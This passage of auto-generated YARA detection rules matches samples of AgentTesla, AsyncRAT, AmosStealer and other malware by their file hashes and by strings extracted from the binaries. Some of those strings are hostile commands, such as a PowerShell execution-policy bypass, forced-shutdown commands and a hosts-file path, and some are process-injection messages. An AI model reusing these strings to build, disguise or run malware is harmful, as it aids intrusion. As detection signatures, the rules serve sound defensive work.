      $s3 = "&TryGetFieldAccessor(get_FieldRuntimeType&get_FieldTypeHandle@" fullword ascii /* score: '12.00'*/
      $s4 = "<get_InternalRuntimeElementTypeNget_InternalRuntimeGenericTypeArguments" fullword ascii /* score: '12.00'*/
      $s5 = "XTryGetStaticFunctionPointerTypeForComponentsBGetStaticClassConstructionContext2TryGetNativeReaderForBlob" fullword ascii /* score: '11.00'*/
      $s6 = "CompareAnyKeys^CompareAnyKeys_DefaultComparer_NoNext_Ascending`CompareAnyKeys_DefaultComparer_NoNext_Descending" fullword ascii /* score: '10.00'*/
      $s7 = "HeaderLength0" fullword ascii /* score: '10.00'*/
      $s8 = "Componentg" fullword ascii /* score: '9.00'*/
      $s9 = "GetTypeCodeImpl*GetAttributeFlagsImpl@" fullword ascii /* score: '9.00'*/
      $s10 = "&GetParametersAsSpan@" fullword ascii /* score: '9.00'*/
      $s11 = "$SendOrPostCallback8SynchronizationLockException(ThreadAbortException8ThreadInt64PersistentCounter" fullword ascii /* score: '8.00'*/
      $s12 = "0GetNonRandomizedHashCodeRGetNonRandomizedHashCodeOrdinalIgnoreCaseZGetNonRandomizedHashCodeOrdinalIgnoreCaseSlow" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__5ba0e07214b3423072c72a6e1cb6e11f_imphash__AgentTesla_signature__719bb222f4bbc8859273f71b5809958a_imph_78 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash2 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash3 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash4 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
   strings:
      $s1 = "4System.Private.CoreLib.dllg" fullword ascii /* score: '22.00'*/
      $s2 = "RehydrateTarget.EnsureComAwareReference" fullword ascii /* score: '20.00'*/
      $s3 = "(System.Text.Json.dll>System.Threading.Tasks.Parallel" fullword ascii /* score: '19.00'*/
      $s4 = "6System.Linq.Expressions.dll0Microsoft.Win32.Registry" fullword ascii /* score: '19.00'*/
      $s5 = "System.Collections.Generic.IEnumerable<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s7 = "System.Collections.Generic.IList<System.Text.RegularExpressions.Group>.get_Item" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Group>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "|<ReduceConcatenationWithAdjacentLoops>g__CanCombineCounts|50_0V<FindAndMakeLoopsAtomic>g__ProcessNode|51_0" fullword ascii /* score: '14.00'*/
      $s10 = "0InitializeClosedInstance8InitializeClosedInstanceSlowFInitializeClosedInstanceToInterfacePInitializeClosedInstanceWithoutNullCh" ascii /* score: '14.00'*/
      $s11 = "*GetDynamicInvokeThunk@" fullword ascii /* score: '13.00'*/
      $s12 = "System.Collections.Generic.IEnumerable<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '13.00'*/
      $s13 = "8GetDelegateDynamicInvokeInfo@" fullword ascii /* score: '13.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '13.00'*/
      $s15 = "ToInt32NoNull&get_HasRuntimeLabel" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f_9bc109acfded2eaae2348204bcab5c1c58a91310539433649_79 {
   meta:
      description = "_subset_batch - from files 97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0_97b2588f.exe, 9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce_9bc109ac.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b_a42eece4.macho, a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594_a9c83151.exe, b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa_b053ca27.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "97b2588f938cb00e2722645865a7fab1ade3b969d8a5e5a0f8ec02d8578632d0"
      hash2 = "9bc109acfded2eaae2348204bcab5c1c58a913105394336490272545d44507ce"
      hash3 = "aa02002f4cdb80fe881ccaad7626f3161e83490b276659ab01879e736f44540f"
      hash4 = "a42eece43aad2e2a2f98d41b1b48025c252452318a864d32d0f9156adaabe65b"
      hash5 = "a9c831511812a6bb688006ddf3498e1bffc6b4ffeeb4b5cccef2bc4e898c0594"
      hash6 = "b053ca276617ab5bc7b02fdd0827ac1ad79f9393b27a8bbeb00b3b476f0cfdaa"
   strings:
      $s1 = "*runtime.errorAddressString" fullword ascii /* score: '13.00'*/
      $s2 = "*runtime.dlogPerM" fullword ascii /* score: '12.00'*/
      $s3 = "*runtime.pcHeader" fullword ascii /* score: '12.00'*/
      $s4 = "*[]runtime.Frame" fullword ascii /* score: '10.00'*/
      $s5 = "*runtime.Frames" fullword ascii /* score: '10.00'*/
      $s6 = "*[2]runtime.Frame" fullword ascii /* score: '10.00'*/
      $s7 = "*runtime.boundsError" fullword ascii /* score: '10.00'*/
      $s8 = "*runtime.Frame" fullword ascii /* score: '10.00'*/
      $s9 = "*runtime.boundsErrorCode" fullword ascii /* score: '10.00'*/
      $s10 = "prepareForSweep" fullword ascii /* score: '9.00'*/
      $s11 = "pcHeader" fullword ascii /* score: '9.00'*/
      $s12 = "dlogPerM" fullword ascii /* score: '9.00'*/
      $s13 = "Comparable" fullword ascii /* score: '9.00'*/
      $s14 = "funcnametab" fullword ascii /* score: '8.00'*/
      $s15 = "raceprocctx" fullword ascii /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f or uint16(0) == 0xfacf ) and filesize < 24000KB and pe.imphash() == "9cbefe68f395e67356e2a5d8d1b285c0" and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008ca694_imphash__AgentTesla_signature__25e306_80 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash2 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash3 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash4 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash5 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash6 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
   strings:
      $s1 = "NSystem.ComponentModel.TypeConverter.dll" fullword ascii /* score: '29.00'*/
      $s2 = "System.CodeDom8Microsoft.Win32.SystemEvents\"SafeProcessHandle" fullword ascii /* score: '27.00'*/
      $s3 = "Executor GeneratorSupport" fullword ascii /* score: '19.00'*/
      $s4 = "CompilerError.CompilerErrorCollection" fullword ascii /* score: '17.00'*/
      $s5 = "[!] Invalid thread handle or payload bas" fullword wide /* score: '16.00'*/
      $s6 = "[!] Failed to get thread context for PE" fullword wide /* score: '15.00'*/
      $s7 = "[*] Processing relocation blocks from 0" fullword wide /* score: '15.00'*/
      $s8 = "RSystem.Configuration.ConfigurationManager>CodeArgumentReferenceExpression2CodeArrayCreateExpression4CodeArrayIndexerExpression&" ascii /* score: '14.00'*/
      $s9 = "[!] Could not get PEB address from contex" fullword wide /* score: '14.00'*/
      $s10 = "CodeConstructor4CodeDefaultValueExpression8CodeDelegateCreateExpression8CodeDelegateInvokeExpression.CodeDirectionExpression" fullword ascii /* score: '13.00'*/
      $s11 = "RSystem.Configuration.ConfigurationManager>CodeArgumentReferenceExpression2CodeArrayCreateExpression4CodeArrayIndexerExpression&" ascii /* score: '13.00'*/
      $s12 = "CodeDirective.CodeDirectiveCollection(CodeEntryPointMethod8CodeEventReferenceExpression" fullword ascii /* score: '12.00'*/
      $s13 = "UriSection4UserScopedSettingAttribute\"UserSettingsGroup" fullword ascii /* score: '12.00'*/
      $s14 = "EventLogEntry.EventLogEntryCollection\"EventLogEntryType" fullword ascii /* score: '12.00'*/
      $s15 = "[!] Failed to get" fullword wide /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5550 or uint16(0) == 0x5a4d ) and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__25e3064d3ad9ad1f40911fe3d3c5c65f_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imph_81 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
   strings:
      $s1 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '21.00'*/
      $s2 = "DDetermineThreadPoolThreadTimeoutMs.get_HasForcedMinThreads.get_HasForcedMaxThreads4GetIOCompletionPollerCount,CreateIOCompletio" ascii /* score: '18.00'*/
      $s3 = "System.Threading.ThreadPool.ProcessorsPerIOPollerThrea" fullword wide /* score: '18.00'*/
      $s4 = "Execute4PerformWaitOrTimerCallback" fullword ascii /* score: '14.00'*/
      $s5 = "VGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread6RegisterWaitForSingle" ascii /* score: '14.00'*/
      $s6 = "VGetOrCreateThreadLocalCompletionCountObject&NotifyThreadBlocked*NotifyThreadUnblocked&RequestWorkerThread6RegisterWaitForSingle" ascii /* score: '14.00'*/
      $s7 = "o.<ExecuteCallback>b__9_0" fullword ascii /* score: '14.00'*/
      $s8 = "(FreeNativeOverlapped0GetNativeOverlappedStatefSystem.Threading.IDeferredDisposable.OnFinalReleaseLCreateThreadLocalCompletionCo" ascii /* score: '14.00'*/
      $s9 = "Failed to create an IO completion port. HR:" fullword wide /* score: '13.00'*/
      $s10 = "System.Diagnostics.Eventing.FrameworkEventSourc" fullword wide /* score: '13.00'*/
      $s11 = "GetInt32Config" fullword ascii /* score: '12.00'*/
      $s12 = "GetNativeOffset4InitializeForCurrentThread@" fullword ascii /* score: '12.00'*/
      $s13 = "&AwakeWaiterIfNeeded2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s14 = "OverlappedData4OnExecutionContextCallback0FinishUnregisteringAsync" fullword ascii /* score: '12.00'*/
      $s15 = "CompareAnyKeys@" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 19000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a3__Logger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8b91d157_AgentTesla_signature__f34d5f2d4577ed6d9ceec516c1f5_82 {
   meta:
      description = "_subset_batch - from files a3--Logger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8b91d157.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24e06184.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_25ea77d8.exe, AgentTesla(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6c0a5cce.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8b91d1572631d84c5f844303768824f864830722a6f67afec38d9f3f1ed25123"
      hash2 = "24e06184fc1bf5b257407c973ab141ea9b4b4ae88e8bf2ba2231f20539491b0f"
      hash3 = "25ea77d8e6b16dd4ddaaf05665d430a0c32fec89901de0596f537a3aeed7e8bd"
      hash4 = "6c0a5cce7cc821d81636aca89eeb21950f7006aa8edf26e67087f86813a1d66a"
   strings:
      $s1 = "{0}. {1} - {2} pts ({3} attempts) [{4}] - {5}" fullword wide /* score: '19.00'*/
      $s2 = "GetTargetNumber" fullword ascii /* score: '14.00'*/
      $s3 = "targetNumber" fullword ascii /* score: '14.00'*/
      $s4 = "lblAttempts" fullword wide /* score: '11.00'*/
      $s5 = "<Attempts>k__BackingField" fullword ascii /* score: '11.00'*/
      $s6 = "Attempts: {0}" fullword wide /* score: '11.00'*/
      $s7 = "Congratulations! You guessed it in {0} attempts!" fullword wide /* score: '11.00'*/
      $s8 = "Attempts:" fullword wide /* score: '11.00'*/
      $s9 = "GetHighScores" fullword ascii /* score: '9.00'*/
      $s10 = "<GetHighScores>b__4_2" fullword ascii /* score: '9.00'*/
      $s11 = "<GetHighScores>b__1" fullword ascii /* score: '9.00'*/
      $s12 = "GameLogic" fullword ascii /* score: '9.00'*/
      $s13 = "gameLogic" fullword ascii /* score: '9.00'*/
      $s14 = "<GetHighScores>b__4_0" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__299569d8_AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_83 {
   meta:
      description = "_subset_batch - from files AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_299569d8.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3ba14d5c.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_52b56ee2.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_d9c88dd0.exe, AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f8375748.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "299569d8e62dfad2126409983ee4758c450e785d52923561a41bd5149aca21a5"
      hash2 = "3ba14d5c4022bac5ad24b4d74aa56040647446222c52bb905d535ed5e26c1a84"
      hash3 = "52b56ee281862172cf1bae61e1d75f0f3b15635f3e9d2f426d298cd21eef35da"
      hash4 = "d9c88dd020a9d2e651ea26fa41d9390cbd175d16ba9c8b3c5037dbc1c21e2886"
      hash5 = "f837574843e489c67fa4de5e35ba44cc5a43d78c55c26605b72be34b8cabceb7"
   strings:
      $x1 = "-ExecutionPolicy Bypass -File \"" fullword wide /* score: '31.00'*/
      $s2 = "SHCore.dll" fullword ascii /* score: '23.00'*/
      $s3 = "shutdown.exe /f /s /t 0" fullword wide /* score: '22.00'*/
      $s4 = "shutdown.exe /f /r /t 0" fullword wide /* score: '22.00'*/
      $s5 = "4System.Web.Services.Protocols.SoapHttpClientProtocol" fullword ascii /* score: '19.00'*/
      $s6 = "shutdown.exe -L" fullword wide /* score: '18.00'*/
      $s7 = "Win32_Processor.deviceid=\"CPU0\"" fullword wide /* score: '15.00'*/
      $s8 = "\\drivers\\etc\\hosts" fullword wide /* score: '13.00'*/
      $s9 = "POST / HTTP/1.1" fullword wide /* score: '12.00'*/
      $s10 = "Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Saf" wide /* score: '12.00'*/
      $s11 = "MyTemplate" fullword ascii /* score: '11.00'*/
      $s12 = "My.Computer" fullword ascii /* score: '11.00'*/
      $s13 = "PCLogoff" fullword wide /* score: '9.00'*/
      $s14 = "RunShell" fullword wide /* score: '9.00'*/
      $s15 = "HostsMSG" fullword wide /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 200KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_84 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_25e3064d3ad9ad1f40911fe3d3c5c65f(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_5ba0e07214b3423072c72a6e1cb6e11f(imphash).exe, AgentTesla(signature)_719bb222f4bbc8859273f71b5809958a(imphash).exe, AgentTesla(signature)_9e1c5e753d9730385056638ab1d72c60(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "0700f6ba7bbe9b9ed0ac97747b56d75da3d2b942a697ddb11344f39f28464177"
      hash5 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash6 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash7 = "44e67d7221acd9c182b1f3fb928d32ac7a29df0642f53936cad8bcbb8c2e7d84"
      hash8 = "dd75642e3700f51c34db53e4636187c6a2c5c0de225e597f6eb0dffec5efc4c0"
      hash9 = "5a4f74ec41051e29202e8c3ae1fa9e521aa81af905d4bed66a4af22f7efbadd7"
      hash10 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash11 = "469e31f638615cb65dd38b450b40024649490930c8c5c84b94e2283835c36a6a"
      hash12 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
      hash13 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $x1 = "System.ComponentModel.Design.IDesigner, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" fullword wide /* score: '34.00'*/
      $s2 = "Couldn't get process information from performance counter" fullword wide /* score: '20.00'*/
      $s3 = "Feature requires a process identifier" fullword wide /* score: '18.00'*/
      $s4 = "Process performance counter is disabled, so the requested operation cannot be performed" fullword wide /* score: '16.00'*/
      $s5 = "No process is associated with this object" fullword wide /* score: '15.00'*/
      $s6 = "Process has exited, so the requested information is not available" fullword wide /* score: '15.00'*/
      $s7 = "Attempt to access the method failed" fullword wide /* score: '14.00'*/
      $s8 = "Attempt to access the type failed" fullword wide /* score: '14.00'*/
      $s9 = "waitHandl" fullword wide /* base64 encoded string 'j+Gjwe' */ /* score: '14.00'*/
      $s10 = "Operation could destabilize the runtime" fullword wide /* score: '12.00'*/
      $s11 = "Attempted to access a non-existing field" fullword wide /* score: '11.00'*/
      $s12 = "Cannot process request because the process ({0}) has exited" fullword wide /* score: '11.00'*/
      $s13 = "Cannot process request because the process has exited" fullword wide /* score: '11.00'*/
      $s14 = "Process must exit before requested information can be determined" fullword wide /* score: '11.00'*/
      $s15 = "Process was not started by this object, so requested information cannot be determined" fullword wide /* score: '11.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x5550 ) and filesize < 22000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__56ffbbdda63dbdf1891621098d41e68d_imphash__AgentTesla_signat_85 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_56ffbbdda63dbdf1891621098d41e68d(imphash).exe, AgentTesla(signature)_fdfd597602a97b999259741e5480e514(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "6a15d4e73d8b68c7cd91c14c0fa94cc3781ed4d6e8a3ec946c792720c843c5f8"
      hash3 = "27d0c0261bf8a7f0dbbf04d60e775834b7150294e25f15f99c679dc1a1663be9"
   strings:
      $s1 = "(UnprocessableContent" fullword ascii /* score: '20.00'*/
      $s2 = "&UnprocessableEntity" fullword ascii /* score: '15.00'*/
      $s3 = "8System.Collections.IList.Add@" fullword ascii /* score: '13.00'*/
      $s4 = "Null ObjectIdentifier ObjectDescriptor" fullword ascii /* score: '13.00'*/
      $s5 = "\"GetCombinedString" fullword ascii /* score: '12.00'*/
      $s6 = "IdnEquivalent.TryGetUnicodeEquivalent" fullword ascii /* score: '12.00'*/
      $s7 = ".GetDefaultProviderFlags*CryptGetKeyParamFlags" fullword ascii /* score: '12.00'*/
      $s8 = "6GetMaxHttp2StreamWindowSize" fullword ascii /* score: '12.00'*/
      $s9 = "\"TemporaryRedirect" fullword ascii /* score: '11.00'*/
      $s10 = "AlreadyReportedA" fullword ascii /* score: '10.00'*/
      $s11 = "ResetContent5" fullword ascii /* score: '10.00'*/
      $s12 = "PartialContent9" fullword ascii /* score: '10.00'*/
      $s13 = "NoContent1" fullword ascii /* score: '10.00'*/
      $s14 = ".HttpVersionNotSupported" fullword ascii /* score: '10.00'*/
      $s15 = "6RequestHeaderFieldsTooLarge" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 22000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AmosStealer_signature__AmosStealer_signature__2a61643c_86 {
   meta:
      description = "_subset_batch - from files AmosStealer(signature).dmg, AmosStealer(signature)_2a61643c.dmg"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "74181455892ed362735d9c7aba8891903e46b71371c02b028f3df75e4792b969"
      hash2 = "2a61643c3b42ead1846d935a4c9f997e624100e42599756cdd1c819ee5d165d7"
   strings:
      $s1 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */ /* score: '26.50'*/
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAEAAAA" ascii /* base64 encoded string '                   @  ' */ /* score: '16.50'*/
      $s3 = "AAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '        @        ' */ /* score: '16.50'*/
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAA" ascii /* base64 encoded string '                      @ ' */ /* score: '16.50'*/
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA" fullword ascii /* base64 encoded string '                      @ @       ' */ /* score: '16.50'*/
      $s6 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */ /* score: '16.50'*/
      $s7 = "aAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '    @               @        ' */ /* score: '16.00'*/
      $s8 = "aAAAAAEAAAAAAAAAA" ascii /* base64 encoded string '    @       ' */ /* score: '14.00'*/
      $s9 = "8AAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */ /* score: '14.00'*/
      $s10 = "aAAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */ /* score: '14.00'*/
      $s11 = "AAAAAAAAAAAAACAAAAAAA" ascii /* base64 encoded string '               ' */ /* score: '12.50'*/
      $s12 = "<string>GPT Header (Primary GPT Header : 1)</string>" fullword ascii /* score: '9.00'*/
      $s13 = "<string>GPT Header (Backup GPT Header : 7)</string>" fullword ascii /* score: '9.00'*/
      $s14 = "AAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* score: '8.50'*/
   condition:
      ( uint16(0) == 0xda78 and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a65f66967ed69bd39685e5b02b99ec97_imphash__AgentTesla_signature__057cca90_AgentTesla_signature__1e90a0e0769973c9f8edd53d008c_87 {
   meta:
      description = "_subset_batch - from files a65f66967ed69bd39685e5b02b99ec97(imphash).exe, AgentTesla(signature)_057cca90.tar, AgentTesla(signature)_1e90a0e0769973c9f8edd53d008ca694(imphash).exe, AgentTesla(signature)_462a1c4623dd5653cfbabfcb88d6bdd9(imphash).exe, AgentTesla(signature)_57a57b52c398ba0bf2f72c7ddb5a9e1e(imphash).exe, AgentTesla(signature)_792661c7a60d6624adab7be57ff57e58(imphash).exe, AgentTesla(signature)_9eeb76c5ed4b34e66260a9300680a9c0(imphash).exe, AgentTesla(signature)_bb4d11c9.tar, AgentTesla(signature)_fcf36bf30437909fd62937df8a303a93(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "758082eaec75e22c896aa70ece7305dc9e3964fcb435fe6e5e1cbb73d379d9bc"
      hash2 = "057cca90c1c6379e12d4723722c8143dbfba3490920d77944ff6d864869bef05"
      hash3 = "3276db816ba3eecb3cc996d09f2333f10c93b1e895276f4953664e7a3dbc4b47"
      hash4 = "e4da512f9f4983b8fe80ba952531414acccd5b037c2c8488055c159c7b88b0c4"
      hash5 = "8603da5c311b08b5868e22b6f495dca6f2925e5582403d59ba9fb617d34c1c1b"
      hash6 = "7d8a20d5f8a916da554fb667337a6f0413dac138a09332d59ebbbb05bc7cfe48"
      hash7 = "2d3689a4a57ad183e445b7221da670b17264aea9090dd0c9735db5ce285e2ddc"
      hash8 = "bb4d11c9981fbf16b12cf1731ff24da3f0f5127bb363fb9cc55b50d8e977f3b2"
      hash9 = "33f5967acccf0ba4bca1b2305d022590aeecdf55427d055c79918f5f88ffe620"
   strings:
      $s1 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '27.00'*/
      $s2 = "DumpHungProcessWithPtype_ExportThunk" fullword ascii /* score: '25.00'*/
      $s3 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '23.00'*/
      $s4 = "EdgeGetInjectionMitigationStatus" fullword ascii /* score: '19.00'*/
      $s5 = "IsTemporaryUserDataDirectoryCreatedForHeadless" fullword ascii /* score: '19.00'*/
      $s6 = "GetInstallDetailsPayload" fullword ascii /* score: '18.00'*/
      $s7 = "?InitializeAppUserModelIdForCurrentProcess@PwaHelperImpl@edge_pwahelper@@QEAA_NXZ" fullword ascii /* score: '18.00'*/
      $s8 = "InjectDumpForHungInput_ExportThunk" fullword ascii /* score: '17.00'*/
      $s9 = "?BindWidgetManager@PwaHelperImpl@edge_pwahelper@@AEAAXV?$ScopedHandleBase@VMessagePipeHandle@mojo@@@mojo@@@Z" fullword ascii /* score: '15.00'*/
      $s10 = "?SetSingletonProcessId@PwaHelperImpl@edge_pwahelper@@UEAAXI@Z" fullword ascii /* score: '15.00'*/
      $s11 = "IsBrowserProcess" fullword ascii /* score: '15.00'*/
      $s12 = "GetUploadConsent_ExportThunk" fullword ascii /* score: '14.00'*/
      $s13 = "EdgeGetElfLoadThreadId" fullword ascii /* score: '12.00'*/
